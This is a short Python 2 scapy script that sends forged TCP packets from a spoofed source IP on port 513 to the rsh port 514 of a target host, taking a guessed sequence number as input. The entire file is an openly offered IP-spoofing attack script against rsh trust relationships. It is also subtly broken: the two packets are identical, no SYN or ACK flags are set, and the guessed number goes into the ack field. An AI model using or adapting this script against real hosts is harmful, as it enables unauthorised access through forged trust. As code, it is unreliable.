#!/usr/bin/env python2
from scapy.all import *
import sys


def spoofer(src, dst, ack):
    IPlayer = IP(src=src, dst=dst)
    TCPlayer = TCP(sport=513, dport=514, ack=ack)
    synP = IPlayer / TCPlayer
    send(synP)
    IPlayer = IP(src=src, dst=dst)
    TCPlayer = TCP(sport=513, dport=514, ack=ack)
    ackP = IPlayer /TCPlayer
    send(ackP)

def main():
    if len(sys.argv) <> 4:
        print("USAGE: %s %s %s %s" % (sys.argv[0], "[spoofd srcIP]", "[dstIP (target)]", "[TCP seq num]"))
        sys.exit()
    else:
        src = sys.argv[1]
        dst = sys.argv[2]
        seqnum = int(sys.argv[3])
        spoofer(src, dst, seqnum)


if __name__=="__main__":
    main()

